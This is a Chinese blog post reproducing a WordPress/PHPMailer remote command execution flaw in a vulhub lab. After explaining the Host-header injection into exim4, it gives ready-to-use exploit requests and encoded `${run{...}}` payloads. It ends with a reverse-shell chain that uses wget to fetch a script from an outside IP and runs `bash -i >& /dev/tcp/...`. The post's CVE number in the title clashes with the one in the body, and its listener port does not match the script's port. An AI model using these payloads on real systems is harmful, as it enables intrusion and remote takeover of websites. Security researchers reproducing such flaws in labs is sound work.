<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="WordPress 远程命令执行漏洞复现(CVE-2018-15877), hybcx&#39;s blog">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>WordPress 远程命令执行漏洞复现(CVE-2018-15877) | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">WordPress 远程命令执行漏洞复现(CVE-2018-15877)</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CVE/">
                                <span class="chip bg-color">CVE</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
                                CVE漏洞
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-08-25
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="0x01-漏洞简述">0x01 漏洞简述</h2>
<blockquote>
<p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p>
</blockquote>
<ul>
<li>漏洞编号： CVE-2016-10033</li>
<li>影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18</li>
</ul>
<h3 id="漏洞触发条件：">漏洞触发条件：</h3>
<ul>
<li>PHP 没有开启 <code>safe_mode</code>（默认）</li>
<li>攻击者需要知道 Web 服务部署的路径</li>
</ul>
<p>成功利用该漏洞后，攻击者可以远程任意代码执行。</p>
<h2 id="0x02-漏洞搭建">0x02 漏洞搭建</h2>
<p>这里我采用vulhub靶场搭建</p>
<p>进入到/vulhub/wordpress/pwnscriptum/目录后，我们执行命令：</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></tbody></table></figure>
<p>访问对应端口即可，记得安全组放行。进去之后按要求配置信息即可，随后在转到忘记密码页面</p>
<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>
<p>![image-20230829150129261](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829150129261.png)</p>
<p>此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是<code>phpmailer &lt; 5.2.18</code>之前的版本存在命令注入漏洞，具体你可以先阅读分析文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">链接</a> 。</p>
<p>我们来看看这个漏洞在wordpress中的情况。漏洞文件是<code>class.phpmailer.php</code>，我们在wordpress中搜索查看这个文件，该文件在在<code>wp-includes</code>目录下。我们可以发现几行关键代码：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Which method to use to send mail.</span><br><span class="hljs-comment">     * Options: "mail", "sendmail", or "smtp".</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> string</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Mailer</span> = <span class="hljs-string">'mail'</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The path to the sendmail program.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> string</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Sendmail</span> = <span class="hljs-string">'/usr/sbin/sendmail'</span>;<br></code></pre></td></tr></tbody></table></figure>
<p>我们发现，实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code>。并且我们继续审计代码发现：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get the server hostname.</span><br><span class="hljs-comment">     * Returns 'localhost.localdomain' if unknown.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@access</span> protected</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> string</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serverHostname</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable">$result</span> = <span class="hljs-string">'localhost.localdomain'</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;Hostname)) {<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;Hostname;<br>        } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">'SERVER_NAME'</span>, <span class="hljs-variable">$_SERVER</span>) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>])) {<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>];<br>        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'gethostname'</span>) &amp;&amp; <span class="hljs-title function_ invoke__">gethostname</span>() !== <span class="hljs-literal">false</span>) {<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">gethostname</span>();<br>        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">'n'</span>) !== <span class="hljs-literal">false</span>) {<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">'n'</span>);<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p><code>serverHostname</code>函数通过传入的<code>SERVER_NAME</code>参数来获取主机名，该主机名即HTTP请求报文中的host值，但是<code>SERVER_NAME</code>参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。</p>
<p>更棒的是，<code>sendmail</code> 提供了<code>-O</code>和<code>-X</code>参数，<code>-X</code>参数用于写入日志文件， 我们可以使用<code>-OQueueDirectory=/tmp/ -X/tmp/smtp.php</code>命令组合，它会将发送的邮件保存到<code>/tmp/smtp.php</code>中， 那么在请求的时候payload应该类似于这样：</p>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wordpress/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aaa( -X/tmp/smtp.php )@qq.com<br></code></pre></td></tr></tbody></table></figure>
<p>在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？</p>
<p>思路很好，然而现实很无奈。</p>
<ul>
<li>wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考<a target="_blank" rel="noopener" href="http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html">链接</a>。</li>
<li>比如我们想要调用<code>/bin/touch</code>的时候也会出问题，因为host字段中如果出现<code>/</code>，服务器会拒绝我们的请求。</li>
</ul>
<p>因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！</p>
<p>正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230829151151126](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829151151126.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Run Exim in expansion testing mode. Exim  discards  its  root<br>                 privilege,  to prevent ordinary users from using this mode to<br>                 read otherwise inaccessible files. If no arguments are given,<br>                 Exim  runs interactively, prompting for lines of data. Other‐<br>                 wise, it processes each argument in turn.<br><br>                 If Exim was built with USE_READLINE=yes in Local/Makefile, it<br>                 tries  to  load  the libreadline library dynamically whenever<br>                 the -be option is used without  command  line  arguments.  If<br>                 successful,  it  uses the readline() function, which provides<br>                 extensive line-editing facilities, for reading the test data.<br>                 A line history is supported.<br><br>                 Long expansion expressions can be split over several lines by<br>                 using backslash continuations. As in Exim's run time configu‐<br>                 ration,  white  space  at  the start of continuation lines is<br>                 ignored. Each argument or data line  is  passed  through  the<br>                 string  expansion  mechanism, and the result is output. Vari‐<br>                 able values from the configuration file (for example,  $qual‐<br>                 ify_domain)  are  available,  but  no message-specific values<br>                 (such as $message_exim_id) are set,  because  no  message  is<br>                 being processed (but see -bem and -Mset).<br><br>                 Note:  If  you  use  this  mechanism to test lookups, and you<br>                 change the data files or databases you are  using,  you  must<br>                 exit  and  restart  Exim before trying the same lookup again.<br>                 Otherwise, because each Exim process caches  the  results  of<br>                 lookups,  you will just get the same result as before.  Macro<br>                 processing is done  on  lines  before  string-expansion:  new<br>                 macros  can  be defined and macros will be expanded.  Because<br>                 macros in the config file are often used for  secrets,  those<br>                 are only available to admin users.<br></code></pre></td></tr></tbody></table></figure>
<p><strong>下面同样也是<code>${substr{10}{1}{$tod_log}}</code>与<code>${substr{0}{1}{$spool_directory}}</code>的原理：</strong></p>
<p>我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230825175812446](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175812446.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数，简单来说，<code>-be</code>参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，<code>$tod_log</code>，它可以显示系统时间。</p>
<p>并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数<code>substr</code>、<code>$run</code>系统调用函数。</p>
<p>我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。</p>
<p>![image-20230825175901430](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175901430.png)</p>
<p>那么同理，我们也可以截取<code>/</code>字符串：</p>
<p>![image-20230825175909679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175909679.png)</p>
<p>我们测试使用<code>$run</code>函数调用系统命令</p>
<p>![image-20230825175924125](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175924125.png)</p>
<p>到这里，遇到的问题都解决了。</p>
<h2 id="0x04-漏洞复现">0x04 漏洞复现</h2>
<h3 id="EXP">EXP</h3>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be ${run{【要执行的命令】}} null)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></tbody></table></figure>
<p>我们在数据包中将要执行的命令，插入到上述payload中指定的位置，就可以实现命令执行了。但是，这个漏洞的利用存在很大的限制，主要限制如下所示：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.执行的命令不能包含大量特殊字符，如:、引号等。<br>2.命令会被转换成小写字母<br>3.命令需要使用绝对路径<br>4.需要知道某一个存在的用户的用户名<br>5.我们处理后的命令会执行，但是不会显示到页面上。<br>为了解决这些坑，漏洞作者想出了，利用 ${substr{0}{1}{$spool_directory}} 代替 / ，用 ${substr{10}{1}{$tod_log}} 代替空格的方法。<br><br>但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 curl -o /tmp/rce example.com/shell.sh 的方法先将他下载到 /tmp 目录中，再去执行。<br></code></pre></td></tr></tbody></table></figure>
<h3 id="利用">利用</h3>
<p>所以，总体来说利用过程如下：</p>
<ul>
<li>编写反弹 shell 的 exp，放到某个网页里。有如下要求：
<ul>
<li>整个 url 的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li>
<li>访问该网页不能跳转，因为 follow 跳转的参数是 <code>-L</code> （大写）</li>
</ul>
</li>
<li>拼接成命令 <code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code> 和命令 <code>/bin/bash /tmp/rce</code></li>
<li>将上述命令中的空格和 / 转换成 <code>${substr{10}{1}{$tod_log}}</code> 和 <code>${substr{0}{1}{$spool_directory}}</code></li>
<li>拼接成 HTTP 包的 Host 头： <code>target(any -froot@localhost -be ${run{command}} null)</code></li>
<li>依次发送这两个拼接好的数据包</li>
</ul>
<h3 id="复现">复现</h3>
<p>漏洞缺陷处在后台找回密码的地方<br>
初始化管理员用户名和密码后访问 <code>https://ip:8080/wp-login.php</code>，点击忘记密码界面</p>
<p>![image-20230825180517679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825180517679.png)<br>
这里用户名为 @1_h bcx</p>
<p>我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null)<br></code></pre></td></tr></tbody></table></figure>
<blockquote>
<p>空格  ==&gt; ${substr{10}{1}{$tod_log}}</p>
<p>/  ==&gt; ${substr{0}{1}{$spool_directory}}</p>
</blockquote>
<p>转换过来就是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)<br></code></pre></td></tr></tbody></table></figure>
<p>![image-20230825191914211](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191914211.png)</p>
<p>在/tmp目录下发现成功生成了测试文件。</p>
<p>![image-20230825191840698](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191840698.png)</p>
<h4 id="反弹-shell">反弹 shell</h4>
<p>利用 <code>curl</code> 或者 <code>wget</code> 命令下载远程文件</p>
<blockquote>
<p>测试下载反弹 shell：<br>
注意：</p>
<ul>
<li>攻击机启用 http 服务</li>
<li>远程 URL 中不能有 <code>http://</code></li>
<li>所有字母必须小写</li>
</ul>
</blockquote>
<p>远程反弹shell脚本：<code>ip/a.txt</code>，内容：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1<br></code></pre></td></tr></tbody></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt<br></code></pre></td></tr></tbody></table></figure>
<p>执行反弹shell：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/bin/bash /tmp/rce<br></code></pre></td></tr></tbody></table></figure>
<p>两个payload转换过来就是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}124.220.233.26${substr{0}{1}{$spool_directory}}a.txt}} null)<br><br>aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)<br></code></pre></td></tr></tbody></table></figure>
<p>在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell</p>
